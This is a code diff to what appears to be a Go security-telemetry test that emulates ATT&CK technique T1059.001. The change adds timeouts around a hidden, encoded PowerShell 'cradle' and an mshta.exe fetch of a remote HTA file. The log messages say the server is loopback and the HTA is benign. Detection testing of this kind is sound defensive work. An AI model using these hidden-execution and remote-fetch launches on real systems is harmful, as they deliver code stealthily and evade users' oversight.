@@ -33,6 +33,7 @@
 package main
 
 import (
+	"context"
 	"encoding/base64"
 	"fmt"
 	"io"
@@ -43,6 +44,7 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -158,12 +160,18 @@ func performTechnique() int {
 	LogMessage("INFO", TECHNIQUE_ID, "Launching powershell.exe -WindowStyle Hidden -EncodedCommand (T1059.001)")
 
 	psArgs := []string{"-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", enc}
-	cmd := exec.Command("powershell.exe", psArgs...)
+	psCtx, psCancel := context.WithTimeout(context.Background(), 90*time.Second)
+	defer psCancel()
+	cmd := exec.CommandContext(psCtx, "powershell.exe", psArgs...)
 	out, runErr := cmd.CombinedOutput()
 	outStr := strings.TrimSpace(string(out))
 	LogProcessExecution("powershell.exe", "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <b64:"+
 		fmt.Sprintf("%d bytes>", len(enc)), 0, runErr == nil, exitCodeOf(runErr), outStr)
 
+	if psCtx.Err() == context.DeadlineExceeded {
+		LogMessage("ERROR", TECHNIQUE_ID, "cradle PowerShell exceeded 90s loopback budget (inconclusive)")
+		return StageError
+	}
 	if runErr != nil {
 		if exitErr, ok := runErr.(*exec.ExitError); !ok {
 			// Process never ran — classify by numeric errno only (Rule 8).
@@ -197,14 +205,21 @@ func performTechnique() int {
 
 	// ------------------------------------------------------------------
 	// Step 5: mshta http:// variant (secondary delivery LOLBin telemetry).
+	// Bounded: mshta renders the fetched document and stays alive until its
+	// window closes — in a headless session that is forever, so a 30s context
+	// bounds the probe. Deadline expiry = fetch happened; telemetry recorded.
 	// ------------------------------------------------------------------
 	fmt.Printf("[STAGE %s] Phase 3: mshta.exe http fetch variant (telemetry)\n", TECHNIQUE_ID)
-	htaCmd := exec.Command("mshta.exe", baseURL+"/a.hta")
+	htaCtx, htaCancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer htaCancel()
+	htaCmd := exec.CommandContext(htaCtx, "mshta.exe", baseURL+"/a.hta")
 	htaOut, htaErr := htaCmd.CombinedOutput()
 	htaStr := strings.TrimSpace(string(htaOut))
 	LogProcessExecution("mshta.exe", fmt.Sprintf("mshta.exe %s/a.hta", baseURL), 0, htaErr == nil, exitCodeOf(htaErr), htaStr)
 	if htaErr != nil {
-		if _, ok := htaErr.(*exec.ExitError); !ok {
+		if htaCtx.Err() == context.DeadlineExceeded {
+			LogMessage("INFO", TECHNIQUE_ID, "mshta fetched benign HTA and kept its render window open (bounded at 30s) - telemetry recorded")
+		} else if _, ok := htaErr.(*exec.ExitError); !ok {
 			code, why := classifySystemBinaryLaunch(htaErr)
 			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("mshta launch outcome (non-fatal variant): %s", why))
 			if code == StageBlocked {
